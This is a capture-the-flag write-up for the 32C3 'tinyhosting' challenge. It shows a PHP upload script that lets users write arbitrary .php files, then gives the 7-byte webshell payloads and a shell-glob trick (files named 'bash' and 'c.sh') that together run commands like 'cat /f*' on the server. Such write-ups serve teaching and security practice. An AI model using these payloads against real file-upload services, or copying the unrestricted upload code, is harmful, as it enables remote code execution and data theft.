# Writeup for tinyhosting

> Solves: 71
> 
> A new file hosting service for very small files. could you pwn it?
> http://136.243.194.53/

Under URL exist form with 2 inputs and submit for create new file:

* Filename (name for created file)
* Content (content for created file, with limit to 7 chars only)

Looking into source reveals:
```html
    <!DOCTYPE html>
    <!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
    <!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
    <!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
    <!--[if gt IE 8]><!-->
    <html lang="en"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>TinyHosting</title>
        <link rel="stylesheet" href="css/style.css">
        <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    </head>
    <body>
    <!-- <a href="./?src=">src</a>-->
    <form method="post" action="" class="login">
        <p>
            <label for="login">Filename:</label>
            <input type="text" name="filename" >
        </p>
        <p>
            <label for="password">Content:</label>
            <input type="text" name="content" maxlength="7">
        </p>
        <p class="login-submit">
            <button type="submit" class="login-button">Create!</button>
        </p>
            </form>

    </body>
    </html>
```

We saw, that one line is commented, so we try use `get` parameter with `src` name. Url looks like `http://136.243.194.53/?src=anything`. Now if we look at the source, we saw source of index.php too.

```php
<?php
$savepath="files/".sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT'])."/";
if(!is_dir($savepath)){
    $oldmask = umask(0);
    mkdir($savepath, 0777);
    umask($oldmask);
    touch($savepath."/index.html");
}
if((@$_POST['filename']) && (@$_POST['content']) ){
    $fp = fopen("$savepath".$_POST['filename'], 'w');
    fwrite($fp, substr($_POST['content'],0,7) );
    fclose($fp);
    $msg = 'File saved to <a>'.$savepath.htmlspecialchars($_POST['filename'])."</a>";
}
?>
    <!DOCTYPE html>
    <!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
    <!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
    <!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
    <!--[if gt IE 8]><!-->
    <html lang="en"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>TinyHosting</title>
        <link rel="stylesheet" href="css/style.css">
        <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    </head>
    <body>
    <!-- <a href="./?src=">src</a>-->
    <form method="post" action="" class="login">
        <p>
            <label for="login">Filename:</label>
            <input type="text" name="filename" >
        </p>
        <p>
            <label for="password">Content:</label>
            <input type="text" name="content" maxlength="7">
        </p>
        <p class="login-submit">
            <button type="submit" class="login-button">Create!</button>
        </p>
        <?php if(@$msg) echo $msg;?>
    </form>

    </body>
    </html>

<?php if(@$_GET['src']) show_source("index.php");?>
```

At first, quick analysis of the script and used functions, gave us these conclusions:

* We can save the file with any name and extension
* File really can contain only 7 bytes (`substr` is safe function)
* We cannot append content to existing file, because `fwrite` with second `w` param, begins save content always from 0 byte

In conclusion we knew, that only way to do something is create an executable file, which will have a max 7 bytes of content. 

First we checked whether php files are executed. In form we create new file:

* filename: `x.php`
* content: `<?=a?>` (<?= is shortest version <?php echo)

After submit, script return a link to our created link, like: `http://136.243.194.53/files/27725b3e4b3edf013480032fe2b318ffff4d04c7/x.php`

File print only `a` without php tags, so we knew that php files are interpreted. Next step was to see if we can call the server console command. So we can create this content ``<?=`w`;`` (`w` is shortest console command which show who is logged on and what they are doing / backticks are shortest version of php `shell_exec()`)

Result was a:
`18:27:23 up 1:28, 1 user, load average: 0.08, 0.04, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 197.0.75.43 16:59 1:27m 0.02s 0.02s`

So we can create executable php files and we can use server command, but limited to 7 bytes, means that 6 bytes are reserved for PHP language syntax, and we have only 1 character for command. Helpful was a command `*`, which if is called, execute command which is contain with all files in directory in alphabetical order. From a script we know, that always in folder exist file index.html, so we can create file only which are lexicographically lower than index.html. 

So we create new php file:

* filename: `x.php`
* content: ``<?=`*`;``

Next we create this file:

* filename: `bash`
* content: `anythin`

and this:

* filename: `c.sh`
* content: `ls -R /` (this command list all files recursively starting with /)

Result on `http://136.243.194.53/files/27725b3e4b3edf013480032fe2b318ffff4d04c7/x.php` was a:

`/bin /dev /file_you_want ... a lot of files`, because we execute finally these command `bash c.sh`

Probably flag exist in file `/file_you_want` so we can replace command `ls -R /` to `cat /f*` by creating new file

* filename: `c.sh`
* content: `cat /f*`

and finally we have the flag from content of file `/file_you_want` 

`32c3_Gr34T_Th1ng5_Are_D0ne_By_A_Ser13s_0f_5ma11_Th1ngs_Br0ught_T0ge7h3r`
